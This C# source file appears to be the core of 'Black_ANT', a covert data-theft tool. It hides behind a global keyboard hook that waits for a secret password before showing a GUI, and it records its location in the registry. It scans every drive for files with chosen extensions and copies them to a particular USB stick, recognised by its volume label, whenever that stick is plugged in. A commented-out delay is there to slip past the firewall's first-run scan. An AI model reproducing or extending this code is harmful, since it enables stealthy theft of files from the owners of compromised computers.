using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Threading.Tasks.Dataflow;
using System.IO;

using EventArguments;
using Security;
using MouseKeyboardActivityMonitor.HookUserActivity;
using DiskDriveListener;
using DiskProbe;
using FileExtension;
using SolRegistry;
using FTP;

namespace Black_ANT
{
    public class MultipleActions
    {
        public List<Action> Actions;
        public static volatile HookToMyPassword PassListener;
        private static volatile RecordKeyPress pressedKeysRecorder;
        private static CancellationTokenSource CTS;
        private static Transaction TTD;
        private static CheckDirectoriesChanges CDC;

        [ThreadStatic] // No changed by any threads
        private static DiskDriveChecker DDC;

        public MultipleActions()
        {
            CTS = new CancellationTokenSource();
            pressedKeysRecorder = new RecordKeyPress();
            DDC = new DiskDriveChecker();
            TTD = new Transaction(AppDataManager.GetMainHashPassword);
            CDC = new CheckDirectoriesChanges(AppDataManager.GetMainHashPassword);

            DDC.OnDiskDriveInserted += DDC_OnDiskDriveInserted;
            DDC.OnDiskDriveRemoval += DDC_OnDiskDriveRemoval;
            Transaction.Reporter += (source, ea) => EventReflector.CallReport.Post(ea);
            SearchEngine.Reporter += (source, e) => EventReflector.CallReport.Post(e);
            AppDataManager.Reporter += (source, e) => EventReflector.CallReport.Post(e);


            Actions = new List<Action>();
           // Actions.Add(WaitKernel);
            Actions.Add(DeclaredLocEXE);
            Actions.Add(RunHookToMyPassword);
            Actions.Add(SearchAllDrives);
            Actions.Add(DiskDriveListener);
        }



        #region <WaitKernel>: Kernel Wait for a few seconds
        /// <summary>
        /// Sleep Kernel for 30sec, because the firewall check any Executable file when running first times...
        /// </summary>
        public void WaitKernel()
        {
            EventReflector.CallReport.Post(new ReportEventArgs("WaitKernel", ReportCodes.WaitStartup, "Start Waiting for 30sec"));
            Thread.Sleep(30 * 1000);
            EventReflector.CallReport.Post(new ReportEventArgs("WaitKernel", ReportCodes.WaitCompleted, "Waiting to be completed"));
        }
        #endregion

        #region <DeclaredLocEXE>: Declared executing location Cluster in Registry.
        public void DeclaredLocEXE()
        {
            EventReflector.CallReport.Post(new ReportEventArgs("DeclaredLocEXE", ReportCodes.RequestedForJob,
                "Request to declared executing location"));

            AppDataManager.SaveData(Application.StartupPath, "ExecuteClusterLoc", AppDataManager.GetMainHashPassword);
        }
        #endregion

        #region <RunHookToMyPassword>: Hook my password to show GUI
        /// <summary>
        /// Create Keyboard Listener for Hook App Password...
        /// </summary>
        /// <param name="_PassListener"></param>
        public void RunHookToMyPassword()
        {
            if (PassListener != null)
                PassListener.Start(AppDataManager.GetHashPassword);
            else // Create it...
            {
                PassListener = new HookToMyPassword();
                PassListener.Reporter += (source, e) => EventReflector.CallReport.Post(e);
                PassListener.PasswordEntered += (source, e) => RunGUI(PassListener.Stop, RunHookToMyPassword);
                PassListener.Start(AppDataManager.GetHashPassword);
            }
        }

        private void RunGUI(Action PreAction, Action PostAction)
        {
            #region Firast Disable Password Hook Listener
            PreAction.DynamicInvoke();
            //
            #endregion

            #region Run GUI
            //
            // Run Graphic User Interface
            //
            try
            {
                Task.WaitAll(Task.Run(async () =>
                {
                    try
                    {
                        await EventReflector.CallReport.SendAsync(new ReportEventArgs("RunGUI", ReportCodes.RequestedForJob, "Request to Start GUI"));

                        GUI BlackANTKernel = new GUI(Environment.TickCount);

                        await EventReflector.CallReport.SendAsync(new ReportEventArgs("RunGUI", ReportCodes.GUIRunning, "GUI Started"));

                        BlackANTKernel.ShowDialog();

                        await EventReflector.CallReport.SendAsync(new ReportEventArgs("RunGUI", ReportCodes.GUIClosed, "GUI Disposed"));
                    }
                    catch (Exception ex) { EventReflector.CallReport.Post(new ReportEventArgs("RunGUI", ex)); }
                }));
            }
            catch (Exception ex) { EventReflector.CallReport.Post(new ReportEventArgs("RunGUI", ex)); }
            //
            #endregion

            #region Finally Enable Password Hook Listener
            PostAction.DynamicInvoke();
            #endregion
        }
        #endregion

        #region <SearchAllDrives>: Find any drives of HDD or Fixed Portable Flash disk and search my extensions from them.
        public void SearchAllDrives()
        {
            if (CDC.CheckDirectoriesDataChanged())
            {
                Task.Run(async () =>
                {
                    List<FileExtensionOption> lstSaveExtensions;
                    FileExtensionUserControl.FileExtensionUserControl.TryParse((string)AppDataManager.ReadData("ExtensionButtons", true), out lstSaveExtensions);

                    if (lstSaveExtensions == null) return;

                    List<FileInfo> detectedFiles = await SearchEngine.DiskParallelProbingAsync(lstSaveExtensions, CTS);

                    if (detectedFiles.Count > 0)
                    {
                        TTD.AddFiles(detectedFiles);
                        TTD.TransferToDisk();
                    }
                });
            }
            else
            {
                EventReflector.CallReport.Post(new ReportEventArgs("MultipleActions",
                        ReportCodes.DiskProbingFinished,
                        "Search Disks Not Necessary"));

                Task.Run(() => TTD.TransferToDisk());
            }
        }
        #endregion

        #region <DiskDriveListener>: Listen for any Plug and Play USB Fixed disks
        public void DiskDriveListener()
        {
            DDC.StartEventsListener();

            //
            // Check any drives for my mass storage
            //
            Task.Factory.StartNew(() =>
            {
                foreach (var drive in DriveInfo.GetDrives())
                    MyMassIdentity(drive);
            }, TaskCreationOptions.LongRunning);
        }

        private void DDC_OnDiskDriveRemoval(object sender, EventArgs e)
        {
            bool findMyMassStorage = false;
            string MyFlashVolumeLabel = (string)AppDataManager.ReadData("VolumeLabel", true);
            foreach (var drive in DiskDriveChecker.Drivers)
                if (drive.Value.VolumeLabel.ToLower() == MyFlashVolumeLabel.ToLower()) findMyMassStorage = true;

            if (!findMyMassStorage && TTD.MassStorageDrive != null)
            {
                EventReflector.CallReport.Post(new ReportEventArgs("DiskDriveChecker.OnDiskDriveRemoval",
                    ReportCodes.MassStorageRejected,
                    "The Mass Storage Rejected"));

                TTD.CancelTransferToDisk();
                TTD.MassStorageDrive = null;
            }
        }

        private void DDC_OnDiskDriveInserted(object sender, DiskDriveInsertionEventArgs e)
        {
            MyMassIdentity(e.DriveInformation);
        }

        private void MyMassIdentity(DriveInfo insertedMass)
        {
            if (insertedMass == null || !insertedMass.IsReady) return;

            string MyFlashVolumeLabel = (string)AppDataManager.ReadData("VolumeLabel", true);

            if (insertedMass.VolumeLabel.ToLower() == MyFlashVolumeLabel.ToLower())
            {
                EventReflector.CallReport.Post(new ReportEventArgs("DiskDriveChecker.OnDiskDriveInserted",
                        ReportCodes.MassStorageInserted,
                        "The Mass Storage Drive Inserted"));

                EventReflector.CallReport.Post(new ReportEventArgs("DiskDriveChecker.OnDiskDriveInserted",
                    ReportCodes.IdentifyMassStorage,
                    "Identify Mass Storage"));

                PassListener.Pause();
                if (new PasswordForm("Data Transfer Permission", AppDataManager.GetMainHashPassword).ShowDialog() == DialogResult.OK)
                {
                    bool findMyMassStorage = false;
                    foreach (var drive in DiskDriveChecker.Drivers)
                        if (drive.Value.VolumeLabel.ToLower() == MyFlashVolumeLabel.ToLower()) findMyMassStorage = true;

                    if (findMyMassStorage) // Maybe when you are typing Password, the Mass storage rejected!
                    {
                        EventReflector.CallReport.Post(new ReportEventArgs("Data Transfer Permission",
                            ReportCodes.IdentityVerificationMassStorage,
                            "Allowed To Transfer data"));

                        TTD.MassStorageDrive = insertedMass;
                        Task.Run(() => TTD.TransferToDisk());
                    }
                    else
                    {
                        EventReflector.CallReport.Post(new ReportEventArgs("DiskDriveChecker.OnDiskDriveRemoval",
                            ReportCodes.MassStorageRejected,
                            "The Mass Storage Rejected"));
                    }
                }
                else
                {
                    EventReflector.CallReport.Post(new ReportEventArgs("Data Transfer Permission",
                        ReportCodes.NotAllowed,
                        "Not allowed To Transfer data, because the password is incorrect!"));
                }
                PassListener.Resume();
            }
        }
        #endregion
    }
}
